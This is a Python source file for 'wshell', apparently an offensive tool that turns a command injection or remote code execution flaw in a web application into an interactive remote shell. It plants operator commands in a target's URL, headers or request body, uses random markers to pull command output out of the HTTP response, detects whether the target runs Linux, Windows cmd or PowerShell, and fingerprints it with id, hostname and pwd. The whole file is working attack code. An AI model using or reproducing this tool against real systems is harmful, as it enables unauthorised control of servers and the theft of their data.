from __future__ import annotations

import copy
import hashlib
import random
import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass
from typing import Any, override
from urllib.parse import quote as url_encode

from wshell.config import Config
from wshell.enums import OSEnum
from wshell.errors import CommandExecutionError, OsDetectionError
from wshell.http.client import HttpClient
from wshell.log import logger


@dataclass(frozen=True)
class RenderedRequest:
    """HTTP request ready to be sent to the target."""

    url: str
    headers: dict[str, str]
    body_kwargs: dict[str, Any]


class ScriptPipeline:
    """Ordered script execution helper."""

    def __init__(self, scripts: Sequence):
        self._scripts = list(scripts)

    def run(self, text: str) -> str:
        for script in self._scripts:
            text = script(text)
        return text


class CommandInjector:
    """HTTP client with RCE capabilities via {code,command,template} injection."""

    OS = None
    COMMAND_DELIMITER = ";"
    PATH_DELIMITER = "/"
    CURRENT_DIRECTORY_COMMAND = ""

    def __init__(
        self,
        config: Config,
        *,
        http_client: HttpClient | None = None,
        detected_os: OSEnum | None = None,
    ):
        self.http_client = http_client or HttpClient(config)
        self.request = config.request
        self.command_placeholder = config.command_placeholder
        self.input_pipeline = ScriptPipeline(config.input_scripts)
        self.output_pipeline = ScriptPipeline(config.output_scripts)
        self.cwd = "."
        self.OS = detected_os or type(self).OS

        if config.prompt is not None:
            self.get_prompt = lambda: f"{config.prompt} "

    def execute(self, cmd: str, strip: bool = True) -> str:
        """Execute the specified command on the target."""

        placeholder = self._generate_output_placeholder()
        rendered_command = self._prepare_command(cmd, placeholder)
        request = self._render_request(rendered_command)
        response = self.http_client.send_request(
            self.request.method,
            request.url,
            headers=request.headers,
            **request.body_kwargs,
        )
        return self._extract_output(response.text, placeholder, strip=strip)

    @property
    def timeout(self) -> float | None:
        """Expose the HTTP timeout as a cmd2 settable on the injector."""

        return self.http_client.timeout

    @timeout.setter
    def timeout(self, value: float | None) -> None:
        self.http_client.timeout = value

    def detect_os(self) -> OSEnum:
        """Try to identify the remote OS."""

        if self.OS:
            return self.OS

        logger.info("Target OS not specified, trying to automatically detect it")
        try:
            cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
            if cmd_output == "wshell\n":
                self.OS = OSEnum.LINUX
                logger.info("Target OS detected as Linux")
            elif cmd_output == "wshell\r\n":
                self.OS = OSEnum.WIN_PSH
                logger.info("Target OS detected as Windows (Powershell)")
        except CommandExecutionError:
            self.COMMAND_DELIMITER = WindowsCmdCommandInjector.COMMAND_DELIMITER
            cmd_output = self.execute("echo wsh${WSHELL}ell", strip=False)
            if cmd_output == "wsh${WSHELL}ell\r\n":
                self.OS = OSEnum.WIN_CMD
                logger.info("Target OS detected as Windows (Command prompt)")
            else:
                raise OsDetectionError(f"Unrecognized output: {repr(cmd_output)}") from None

        if not self.OS:
            logger.error("Unable to detect target OS automatically. Please, specify it manually.")
            raise OsDetectionError("Unable to detect target OS")

        return self.OS

    def _generate_output_placeholder(self) -> str:
        return hashlib.md5(f"wshell-{random.random()}".encode()).hexdigest()

    def _prepare_command(self, cmd: str, placeholder: str) -> str:
        cmd = self._remove_commented_out(cmd)
        cmd = f"cd {self.cwd}{self.COMMAND_DELIMITER}{cmd}"
        logger.debug(f"Executing command: {cmd}")
        # The command to run is wrapped around some placeholder to be able to correctly identify the
        # command output even if there is some garbage or the server print the raw command in the
        # response page too.
        #
        # Example:
        #   $ echo 7ddf32e17a6ac5ce04a8ecbf782ca509;id;echo 7ddf32e17a6ac5ce04a8ecbf782ca509
        #   7ddf32e17a6ac5ce04a8ecbf782ca509\nuid=0(root) gid=0(root) groups=0(root)7ddf32e17a6ac5ce04a8ecbf782ca509\n
        #
        # We will then extract every output delimited by '7ddf32e17a6ac5ce04a8ecbf782ca509\n' to get
        # as output:
        #
        #   uid=0(root) gid=0(root) groups=0(root)
        #
        wrapped_command = f"echo {placeholder}{self.COMMAND_DELIMITER}{cmd}{self.COMMAND_DELIMITER}echo {placeholder} "
        logger.debug(f"Using placeholder: {placeholder}")
        return self.input_pipeline.run(wrapped_command)

    def _render_request(self, command: str) -> RenderedRequest:
        headers = {
            key: value.replace(self.command_placeholder, command)
            for key, value in self.request.headers.items()
        }
        body = replace_placeholder(
            copy.deepcopy(self.request.body_params), self.command_placeholder, command
        )
        body_kwargs = {"json": body} if self.request.use_json else {"data": body}
        return RenderedRequest(
            url=self.request.url.replace(self.command_placeholder, url_encode(command)),
            headers=headers,
            body_kwargs=body_kwargs,
        )

    def _extract_output(self, output: str, placeholder: str, *, strip: bool) -> str:
        output = self.output_pipeline.run(output)
        match = re.search(
            rf"{placeholder}(?:\r?\n|\ )(?P<command_output>.*?){placeholder}(?:\r?\n|\ )",
            output,
            re.DOTALL,
        )

        if not match:
            logger.debug(f"Got unexpected HTTP response:\n{output}")
            raise CommandExecutionError("Failed to parse command output")

        command_output = match.group("command_output")
        return command_output if not strip else command_output.strip()

    def _remove_commented_out(self, cmd: str) -> str:
        """Remove any commented out part of the command."""

        return re.sub(r"#.*$", "", cmd, flags=re.MULTILINE)

    def is_linux(self) -> bool:
        return self.detect_os() is OSEnum.LINUX

    def is_windows_cmd(self) -> bool:
        return self.detect_os() is OSEnum.WIN_CMD

    def is_windows_psh(self) -> bool:
        return self.detect_os() is OSEnum.WIN_PSH

    def is_windows(self) -> bool:
        return self.is_windows_cmd() or self.is_windows_psh()

    def change_directory(self, directory: str) -> str:
        """Try to change directory and print the resulting path."""

        if directory.startswith("."):
            # To make `cd .` and `cd ..` works we need to prepend the current directory
            directory = f"{self.cwd}{self.PATH_DELIMITER}{directory}"

        self.cwd = self.execute(
            f"cd {directory}{self.COMMAND_DELIMITER}{self.CURRENT_DIRECTORY_COMMAND}"
        )
        logger.debug(f"Directory changed to: {self.cwd}")
        return self.cwd

    def current_directory(self) -> str:
        return self.change_directory(".")

    def get_prompt(self) -> str:
        """Get the specific prompt string for the target OS"""
        raise NotImplementedError


def replace_placeholder(value: Any, placeholder: str, command: str) -> Any:
    """Recursively replace the command placeholder inside nested request data."""

    if isinstance(value, Mapping):
        return {
            key: replace_placeholder(nested_value, placeholder, command)
            for key, nested_value in value.items()
        }
    if isinstance(value, Sequence) and not isinstance(value, str):
        return [replace_placeholder(item, placeholder, command) for item in value]
    if isinstance(value, str):
        return value.replace(placeholder, command)
    return value


class LinuxCommandInjector(CommandInjector):
    """Linux HTTP client with RCE capabilities."""

    OS = OSEnum.LINUX
    CURRENT_DIRECTORY_COMMAND = "pwd"

    @override
    def get_prompt(self):
        # Outputs like "www-data@target:/var/www/html$ "
        # in case of user with no username it will use the user ID
        user_info = self.execute("id", strip=True)
        user_name_or_id = re.match(r"^uid=(?P<user_id>\d+)(\((?P<username>.*?)\))? ", user_info)
        user = (
            user_name_or_id.group("username") or user_name_or_id.group("user_id")
            if user_name_or_id
            else "unknown"
        )
        host = self.execute("hostname", strip=True)
        pwd = self.execute("pwd", strip=True)
        return f"{user}@{host}:{pwd}{'$' if user not in ('root', '0') else '#'} "

    @override
    def change_directory(self, directory: str) -> str:
        # Make `cd` with no arguments works
        if not directory.strip():
            self.cwd = "."
        return super().change_directory(directory)


class WindowsCmdCommandInjector(CommandInjector):
    """Windows Command Prompt HTTP client with RCE capabilities."""

    OS = OSEnum.WIN_CMD
    COMMAND_DELIMITER = "&"
    PATH_DELIMITER = "\\"
    CURRENT_DIRECTORY_COMMAND = "cd"

    @override
    def _remove_commented_out(self, cmd: str) -> str:
        # Matches:
        #   REM <comment>
        #   @REM <comment>
        #   :: <comment>
        #   command& REM <comment>
        return re.sub(r"(&\s*)?(@?REM|::).*$", "", cmd, flags=re.MULTILINE | re.IGNORECASE)

    @override
    def get_prompt(self):
        # Outputs like "C:\Users\wshell>"
        return f"{self.current_directory()}> "


class WindowsPshCommandInjector(CommandInjector):
    """Windows PowerShell HTTP client with RCE capabilities."""

    OS = OSEnum.WIN_PSH
    PATH_DELIMITER = "\\"
    # On Powershell `Get-Location` returns a multiline string like:
    #
    #   PS C:\Users\> Get-Location
    #
    #   Path
    #   ----
    #   C:\Users\
    #
    # If used in a string concatenation we get the path only
    #
    CURRENT_DIRECTORY_COMMAND = "'' + (Get-Location)"

    @override
    def get_prompt(self):
        # Outputs like "PS C:\Users\wshell>"
        return f"PS {self.current_directory()}> "


class InjectorFactory:
    """Create the correct injector instance without repeated OS detection."""

    _os_injector_map: dict[OSEnum, type[CommandInjector]] = {
        OSEnum.LINUX: LinuxCommandInjector,
        OSEnum.WIN_CMD: WindowsCmdCommandInjector,
        OSEnum.WIN_PSH: WindowsPshCommandInjector,
    }

    @classmethod
    def build(cls, config: Config) -> CommandInjector:
        http_client = HttpClient(config)
        detected_os = config.os or CommandInjector(config, http_client=http_client).detect_os()
        injector_class = cls._os_injector_map.get(detected_os)
        if injector_class is None:
            raise OsDetectionError(f"Unknown OS: {detected_os}")
        return injector_class(config, http_client=http_client, detected_os=detected_os)


def get_command_injector(config: Config) -> CommandInjector:
    """Return an initialized command injector for the specified or detected OS."""

    return InjectorFactory.build(config)
